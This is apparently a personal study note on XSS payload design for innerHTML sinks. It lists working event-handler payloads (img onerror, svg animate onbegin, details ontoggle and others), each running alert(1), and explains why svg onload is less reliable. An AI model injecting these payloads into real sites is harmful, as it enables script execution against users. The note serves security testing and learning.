---
id: "202606130003"
title: Reliable non-script event payloads for DOM and innerHTML sinks
date: 2026-06-13
type: concept
tags: [xss, payload-design, innerhtml, svg]
publish: false
---

Since [[202606130002 innerHTML never executes script tags]], any `innerHTML`-family sink needs a tag whose *native browser behaviour* fires JavaScript without a `<script>` element. Ranked by reliability:

```javascript
// 1. Most reliable — src is broken by design, doesn't depend on any load/animation lifecycle
<img src=x onerror=alert(1)>

// 2. Fires immediately on insertion, no user interaction
<input autofocus onfocus=alert(1)>

// 3. SVG's own animation engine — fires on insertion, not page load
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animateTransform attributeName="transform" onbegin=alert(1)>

// 4. Toggle trick
<details open ontoggle=alert(1)>

// SVG equivalents of img onerror, for contexts where <img> itself is blocked:
<svg><image href=x onerror=alert(1)></svg>
<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
```

Note `<svg onload=alert(1)>` is deliberately **not** at the top: `onload` on `<svg>` is tied to the resource-load lifecycle similar to `<body onload>`, and many browsers don't re-trigger it for elements inserted dynamically after the document has already loaded — it's a page-parse-time event, not an insertion-time one. `<svg><animate onbegin>` sidesteps this entirely because it isn't a load event.

## Links
- Motivating problem: [[202606130002 innerHTML never executes script tags]]
- Used in: [[202606130001 DOM XSS via an innerHTML sink]]
- Same tag family reused for a different filter (blocked event handlers) in: [[202607080004 Reflected XSS via SVG animate setting a blocked href attribute]]
